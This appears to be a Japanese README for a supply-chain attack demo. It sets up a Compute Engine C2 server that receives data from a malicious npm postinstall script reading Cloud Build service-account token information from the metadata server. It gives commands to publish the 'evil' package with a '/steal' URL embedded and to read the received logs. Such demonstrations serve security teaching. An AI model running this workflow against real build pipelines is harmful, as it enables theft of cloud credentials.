# 攻撃者用 C2 受信サーバー: Compute Engine（GCE）

Cloud Build 環境内で実行される悪性パッケージ（`expense-format@1.0.1` の `postinstall` スクリプト）が、取得したアクセス証明データを送信する宛先（C2 サーバー）です。Container-Optimized OS（COS）VM 上でシンプルな HTTP 受信サーバーを稼働させ、到達した通信データ（ビーコン）を記録・閲覧します。

## 安全性に関する基本方針
- 受信するデータは**安全性を担保したシミュレーション構成**に基づくものです。悪性パッケージは実際にメタデータサーバーへアクセスしてビルド用 SA のトークン情報を参照しますが、**送信されるのは「アクセスに成功した証拠データのみ」**（SA メールアドレス、トークン長、SHA-256 ハッシュ値、先頭数文字）であり、**悪用可能なトークン自体は一切送信されません**。
- 本受信サーバーは HTTP（暗号化なし）・デモ検証用途限定で動作します。VM のファイアウォール設定により、アクセスを Google の IP レンジおよび運用者の IP アドレスからのみに制限します。演習期間中のみ起動し、完了後は速やかに `teardown.sh` を実行してリソースを削除してください。

## 構成ファイル一覧
- `server.js` … 受信サーバープログラム（`POST /steal` でログを記録、`GET /log` でログを閲覧）
- `startup.sh` … COS VM の起動スクリプト（Node.js 受信サーバーをコンテナとして実行）
- `provision.sh` … VM インスタンスの作成およびファイアウォール設定スクリプト（tcp:9099 ポートへの通信を Google IP レンジおよび運用者 IP に限定許可）
- `teardown.sh` … VM インスタンスおよびファイアウォールルールの削除スクリプト

## 実行手順
```bash
# 1) C2 受信サーバーの構築（※ VM の作成に伴い課金が発生します）
PROJECT=YOUR_PROJECT ZONE=asia-northeast1-b gce/attacker/provision.sh
#    出力される「C2 受信 URL: http://<IP>:9099/steal」の値を記録しておきます

# 2) 悪性バージョンの送信先 URL として上記アドレスを指定してパブリッシュ（送信先アドレスはパブリッシュ時にパッケージ内へ埋め込まれます）
ATTACKER=http://<IP>:9099/steal REG=http://<VerdaccioIP>:4873/ gce/publish.sh evil

# 3) 攻撃デモとして frontend の再ビルドを実行 → Cloud Build 内の postinstall スクリプトが C2 サーバーへビーコンを送信

# 4) データ受信の確認（VM に SSH してコンテナのログを確認）
gcloud compute ssh attacker-receiver --zone asia-northeast1-b --command 'docker logs attacker-receiver'
#    HTTP で確認する場合（運用者 IP からのみ許可）: curl -s http://<IP>:9099/log

# （任意）受信ログのクリア。docker restart では消えない（json-file ログはコンテナに永続）ため truncate する。
#   実演前にテスト分を消してクリーンにしたい場合に実行する。
gcloud compute ssh attacker-receiver --zone asia-northeast1-b \
  --command 'sudo truncate -s 0 "$(docker inspect --format={{.LogPath}} attacker-receiver)"'
#    GET /log（server.js のメモリ上の受信配列）をリセットする場合: docker restart attacker-receiver

# クリーンアップ（リソース削除）
PROJECT=YOUR_PROJECT ZONE=asia-northeast1-b gce/attacker/teardown.sh
```

> 送信されるデータ（メタデータサーバーへのアクセス結果および資格情報アクセスの痕跡）の仕様は `expense-format-evil` パッケージ側に実装されています。パブリッシュ時に環境変数 `ATTACKER` を埋め込む構成を採ることで、ビルド実行時に環境変数の引き継ぎ制限が存在する Cloud Build 環境においても確実に送信先アドレスを確定させることができます。
